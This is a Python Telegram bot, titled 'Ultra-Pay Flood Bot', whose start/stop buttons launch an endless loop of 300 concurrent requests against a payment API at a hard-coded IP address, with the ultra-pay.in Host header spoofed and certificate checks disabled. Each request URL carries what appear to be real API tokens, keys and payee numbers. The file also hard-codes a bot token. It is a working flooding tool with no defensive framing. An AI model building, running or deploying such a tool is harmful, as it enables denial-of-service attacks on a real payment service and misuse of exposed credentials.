# bot.py
#!/usr/bin/env python3
"""
Telegram Bot with Webhook - No Conflict
"""
import asyncio
import aiohttp
from itertools import cycle
from datetime import datetime
import os
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import logging

# Bot Token and Admin ID
BOT_TOKEN = "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo"
ADMIN_ID = 8401097557

URLS = [
    "https://148.113.13.242/APIs/api?token=IKJ6bCOnVVkb1N5K5dIHOS00T7HwxGECTdR9d6ml&key=fMdb6XOjYp6U0JDj9pSl&paytoNumber=1730611550&amount=1&comment=hi",
    "https://148.113.13.242/APIs/api?token=cUcM3sX925Z0vEqJ5Er80HNd7mpDQLHWJrlZ5Y5Ln&key=e7oIeqLCd4N32M2A&paytoNumber=9234383141&amount=1&comment=hi"
]

HEADERS = {
    "Host": "ultra-pay.in",
    "User-Agent": "Mozilla/5.0",
    "Connection": "keep-alive"
}

# Global variables
flood_active = False
total_requests = 0
successful_requests = 0
failed_requests = 0
timeout_count = 0
error_count = 0
status_counts = {}
start_time = None

logging.basicConfig(level=logging.INFO)

# Flask app for webhook
app = Flask(__name__)

async def fetch_one(session, url, semaphore):
    global total_requests, successful_requests, failed_requests, timeout_count, error_count, status_counts
    
    async with semaphore:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10, connect=5)) as resp:
                total_requests += 1
                status = resp.status
                
                if status == 200:
                    successful_requests += 1
                else:
                    failed_requests += 1
                
                status_counts[status] = status_counts.get(status, 0) + 1
                await resp.text()
                return status
                
        except asyncio.TimeoutError:
            total_requests += 1
            failed_requests += 1
            timeout_count += 1
            status_counts['TIMEOUT'] = status_counts.get('TIMEOUT', 0) + 1
            return None
            
        except Exception:
            total_requests += 1
            failed_requests += 1
            error_count += 1
            status_counts['ERROR'] = status_counts.get('ERROR', 0) + 1
            return None

async def flood_loop():
    global flood_active
    
    CONCURRENT = 300
    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    semaphore = asyncio.Semaphore(CONCURRENT)
    url_cycle = cycle(URLS)
    
    async with aiohttp.ClientSession(connector=connector, headers=HEADERS) as session:
        while flood_active:
            tasks = []
            for _ in range(CONCURRENT):
                target_url = next(url_cycle)
                tasks.append(fetch_one(session, target_url, semaphore))
            
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.1)

# Bot handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("▶️ Start Flood", callback_data="start_flood"),
            InlineKeyboardButton("⏹️ Stop Flood", callback_data="stop_flood")
        ],
        [InlineKeyboardButton("📊 Get Stats", callback_data="stats")],
        [InlineKeyboardButton("🔄 Reset Stats", callback_data="reset")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🤖 *Ultra-Pay Flood Bot*\n\n"
        "Bot sends high-concurrency requests to ultra-pay.in API\n"
        "Use buttons below:\n\n"
        f"📌 Status: {'🟢 Active' if flood_active else '🔴 Stopped'}\n"
        f"📊 Total: {total_requests}\n"
        f"✅ Success: {successful_requests}",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flood_active, total_requests, successful_requests, failed_requests, timeout_count, error_count, status_counts, start_time
    
    query = update.callback_query
    await query.answer()
    
    if query.data == "start_flood":
        if not flood_active:
            flood_active = True
            start_time = datetime.now()
            asyncio.create_task(flood_loop())
            await query.edit_message_text(
                "🟢 *Flood Started!*\n\n"
                "Sending 300 concurrent requests...\n"
                "Use 'Get Stats' to see progress.",
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text("⚠️ *Flood is already running!*", parse_mode='Markdown')
            
    elif query.data == "stop_flood":
        if flood_active:
            flood_active = False
            elapsed = (datetime.now() - start_time).total_seconds() if start_time else 0
            rate = total_requests / elapsed if elapsed > 0 else 0
            
            await query.edit_message_text(
                f"⏹️ *Flood Stopped!*\n\n"
                f"📊 *Final Statistics:*\n"
                f"📌 Total: {total_requests}\n"
                f"✅ Success: {successful_requests}\n"
                f"❌ Failed: {failed_requests}\n"
                f"⏰ Timeouts: {timeout_count}\n"
                f"🔴 Errors: {error_count}\n"
                f"📈 Rate: {rate:.1f} req/s\n"
                f"⏱️ Time: {elapsed:.1f}s\n"
                f"📊 Status: {dict(list(status_counts.items())[:5])}",
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text("⚠️ *Flood is already stopped!*", parse_mode='Markdown')
            
    elif query.data == "stats":
        elapsed = (datetime.now() - start_time).total_seconds() if start_time and flood_active else 0
        rate = total_requests / elapsed if elapsed > 0 else 0
        
        stats_text = (
            f"📊 *Live Statistics*\n\n"
            f"🟢 Status: {'🟢 Active' if flood_active else '🔴 Stopped'}\n"
            f"📌 Total Requests: {total_requests}\n"
            f"✅ Successful: {successful_requests}\n"
            f"❌ Failed: {failed_requests}\n"
            f"⏰ Timeouts: {timeout_count}\n"
            f"🔴 Errors: {error_count}\n"
            f"📈 Success Rate: {successful_requests/(total_requests or 1)*100:.1f}%\n"
            f"⚡ Speed: {rate:.1f} req/s\n"
            f"📊 Status Codes: {dict(list(status_counts.items())[:5])}"
        )
        await query.edit_message_text(stats_text, parse_mode='Markdown')
        
    elif query.data == "reset":
        if not flood_active:
            total_requests = 0
            successful_requests = 0
            failed_requests = 0
            timeout_count = 0
            error_count = 0
            status_counts = {}
            start_time = None
            await query.edit_message_text("🔄 *Stats Reset!*", parse_mode='Markdown')
        else:
            await query.edit_message_text("⚠️ *Cannot reset while flood is running!*", parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Commands:*\n\n"
        "/start - Show main menu\n"
        "/stats - Show current statistics\n"
        "/help - Show this help",
        parse_mode='Markdown'
    )

# Flask route for webhook
@app.route(f'/{BOT_TOKEN}', methods=['POST'])
async def webhook():
    try:
        update = Update.de_json(request.get_json(force=True), bot_app.bot)
        await bot_app.process_update(update)
        return 'ok', 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return 'error', 500

@app.route('/', methods=['GET'])
def home():
    return "Bot is running!"

def setup_bot():
    """Setup bot application"""
    global bot_app
    bot_app = Application.builder().token(BOT_TOKEN).build()
    
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("help", help_command))
    bot_app.add_handler(CallbackQueryHandler(button_handler))
    
    return bot_app

if __name__ == "__main__":
    # Setup bot
    bot_app = setup_bot()
    
    # Set webhook
    port = int(os.environ.get("PORT", 8080))
    
    # Clear any existing webhook
    import requests
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
    
    # Set webhook
    webhook_url = f"https://{os.environ.get('RAILWAY_STATIC_URL')}/{BOT_TOKEN}" if os.environ.get('RAILWAY_STATIC_URL') else f"http://localhost:{port}/{BOT_TOKEN}"
    
    if os.environ.get('RAILWAY_STATIC_URL'):
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}")
        print(f"✅ Webhook set: {webhook_url}")
    else:
        # Local development - use polling
        print("⚠️ Local mode - using polling")
        bot_app.run_polling()
    
    # Run Flask
    print(f"🚀 Starting bot on port {port}")
    app.run(host='0.0.0.0', port=port)
